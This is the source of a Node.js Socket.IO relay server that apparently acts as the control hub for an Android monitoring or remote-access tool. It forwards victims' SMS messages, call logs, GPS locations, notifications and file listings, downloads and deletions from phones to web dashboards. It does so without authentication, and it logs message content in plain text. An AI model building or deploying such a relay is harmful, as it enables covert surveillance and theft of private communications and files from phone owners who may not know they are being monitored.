const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: false,
    transports: ['websocket', 'polling']
  },
  pingInterval: 25000,
  pingTimeout: 60000,
  allowUpgrades: true
});

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));

app.use((req, res, next) => {
  console.log(`[HTTP] ${req.method} ${req.url} from ${req.ip}`);
  next();
});

app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

let webClients = new Set();
let androidClients = new Set();

// Log all Socket.IO events
io.on('connection', socket => {
  console.log(`[SOCKET] Client connected: ${socket.id} from ${socket.handshake.address}`);
  console.log(`[SOCKET] Connection transport: ${socket.conn.transport.name}`);
  socket.emit('id', socket.id);

  socket.on('error', (error) => {
    console.error(`[SOCKET ERROR] ${socket.id}: ${error}`);
  });

  socket.on('connect_error', (error) => {
    console.error(`[CONNECT ERROR] ${socket.id}: ${error.message}`);
  });

  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${socket.id} - Reason: ${reason}`);
    webClients.delete(socket.id);
    androidClients.delete(socket.id);
    console.log(`[CLIENTS] Web: ${webClients.size}, Android: ${androidClients.size}`);
    // Notify other clients that this client disconnected
    if (webClients.size > 0) {
      io.to(Array.from(webClients)[0]).emit('client-disconnected', socket.id);
    }
  });

  socket.on('identify', (type, deviceId) => {
    console.log(`[IDENTIFY] ${socket.id} identified as: ${type}, Device ID: ${deviceId}`);
    if (type === 'web') {
      webClients.add(socket.id);
      // Send all connected Android clients to the web
      const androidClientList = Array.from(androidClients).map(id => ({
        id: id,
        address: io.sockets.sockets.get(id)?.handshake?.address || 'Unknown',
        deviceId: io.sockets.sockets.get(id)?.deviceId || 'N/A'
      }));
      console.log(`[IDENTIFY] Sending ${androidClientList.length} Android clients to web ${socket.id}`);
      socket.emit('android-clients-list', androidClientList);
      
      // Notify all existing Android clients about new web client
      androidClients.forEach(androidId => {
        console.log(`[NOTIFY] Sending web-client-ready to Android ${androidId}`);
        io.to(androidId).emit('web-client-ready', socket.id);
      });
    } else if (type === 'android') {
      androidClients.add(socket.id);
      io.sockets.sockets.get(socket.id).deviceId = deviceId; // Store deviceId with socket
      // Send new Android client info to all web clients
      const newAndroidInfo = {
        id: socket.id,
        address: socket.handshake.address,
        deviceId: deviceId
      };
      console.log(`[NOTIFY] Sending android-client-connected to ${webClients.size} web clients`);
      webClients.forEach(webId => {
        io.to(webId).emit('android-client-connected', newAndroidInfo);
      });
    }
    console.log(`[CLIENTS] Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('web-client-ready', (id) => {
    if (id !== socket.id) {
      console.warn(`Invalid web-client-ready ID: ${id}, expected: ${socket.id}`);
      return;
    }
    console.log(`Web client ${id} announced readiness`);
    webClients.add(id);
    androidClients.forEach(androidId => {
      console.log(`Notifying Android ${androidId} about web client ${id}`);
      io.to(androidId).emit('web-client-ready', id);
    });
  });

  socket.on('signal', data => {
    console.log(`[SIGNAL] Relaying from ${data.from} to ${data.to}: ${data.signal?.type || 'candidate'}`);
    if (!data.to) {
      console.error(`[SIGNAL ERROR] Missing recipient in signal from ${socket.id}`);
      socket.emit('error', { message: 'Missing recipient "to" field', code: 'INVALID_SIGNAL' });
      return;
    }
    if (!io.sockets.sockets.get(data.to)) {
      console.warn(`[SIGNAL ERROR] Recipient ${data.to} not connected`);
      socket.emit('error', { message: `Recipient ${data.to} not found`, code: 'RECIPIENT_NOT_FOUND' });
      return;
    }
    io.to(data.to).emit('signal', data);
    console.log(`[SIGNAL] Delivered to ${data.to}`);
  });

  socket.on('notification', data => {
    console.log(`Relaying notification from ${data.from} to ${data.to}`);
    console.log(`Notification content: ${JSON.stringify(data.notification)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('notification', data);
      console.log(`Notification delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for notification`);
      socket.emit('error', { message: `Recipient ${data.to} not found for notification`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('call_log', data => {
    console.log(`Relaying call log from ${data.from} to ${data.to}`);
    console.log(`Call log content: ${JSON.stringify(data.call_logs)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('call_log', data);
      console.log(`Call log delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for call log`);
      socket.emit('error', { message: `Recipient ${data.to} not found for call log`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('sms', data => {
    console.log(`Relaying SMS from ${data.from} to ${data.to}`);
    console.log(`SMS content: ${JSON.stringify(data.sms_messages)}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('sms', data);
      console.log(`SMS delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for SMS`);
      socket.emit('error', { message: `Recipient ${data.to} not found for SMS`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('location', data => {
    console.log(`Relaying location from ${data.from} to ${data.to}`);
    console.log(`Location content: lat=${data.latitude}, lng=${data.longitude}`);
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('location', data);
      console.log(`Location delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for location`);
      socket.emit('error', { message: `Recipient ${data.to} not found for location`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  // File Explorer Events
  const fsEvents = ['fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete', 'fs:download_start', 'fs:download_chunk', 'fs:download_complete', 'fs:download_error'];
  console.log('Registering FS Event Handlers'); // Debug log to confirm code load
  fsEvents.forEach(event => {
    socket.on(event, data => {
      console.log(`Relaying ${event} from ${socket.id}`);
      console.log(`Current clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
      // Incoming data might be just a path string (from Web) or an object (from Android)
      // We expect the client (Web) to send { to: targetId, path: "..." } for commands
      // And Android to send { to: targetId, ... } for responses
      
      let targetId = null;
      let payload = data;

      // Unpack "to" content if it exists, otherwise we might need to look it up 
      // (Simple relay logic: blindly trust 'to' field if present)
      if (typeof data === 'object' && data.to) {
        targetId = data.to;
      } else if (Array.isArray(data) && data.length > 0) {
          // Some old socket libraries send args as array. 
          // But our Android impl sends arguments individually or as objects.
          // Let's assume standard object emission with 'to' property for robust routing.
      }
      
      // Special handling if the client didn't wrap it (e.g. naive emit). 
      // But our updated implementation plan and Android code use wrapped objects {to, ...}
      
      if (targetId && io.sockets.sockets.get(targetId)) {
        io.to(targetId).emit(event, payload);
        console.log(`${event} relayed to ${targetId}`);
      } else {
        // Fallback: If Sender is Web, send to all Androids? 
        // If Sender is Android, send to all Webs?
        // For security/stability, we prefer explicit 'to'. 
        // However, for lazy dev, if 'to' is missing:
        if (webClients.has(socket.id)) {
             // Web sent it, broadcast to all Androids (usually just one)
             androidClients.forEach(id => io.to(id).emit(event, payload));
             console.log(`${event} broadcast to all Androids`);
        } else if (androidClients.has(socket.id)) {
             // Android sent it, broadcast to all Webs
             webClients.forEach(id => io.to(id).emit(event, payload));
             console.log(`${event} broadcast to all Webs`);
        } else {
             console.warn(`Could not route ${event} from ${socket.id}`);
        }
      }
    });
  });

  socket.on('error', (error) => {
    console.error(`Socket error from ${socket.id}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║        Socket.IO Server Started Successfully                 ║
╚══════════════════════════════════════════════════════════════╝
Port: ${PORT}
Address: 0.0.0.0:${PORT}
Web Interface: http://localhost:${PORT} (local)
Remote Access: https://tom-b4wk.onrender.com (if deployed)

Logging all Socket.IO events with [SOCKET], [SIGNAL], [NOTIFY], etc.
  `);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  server.close(() => {
    console.log('Server shut down gracefully');
    process.exit(0);
  });
});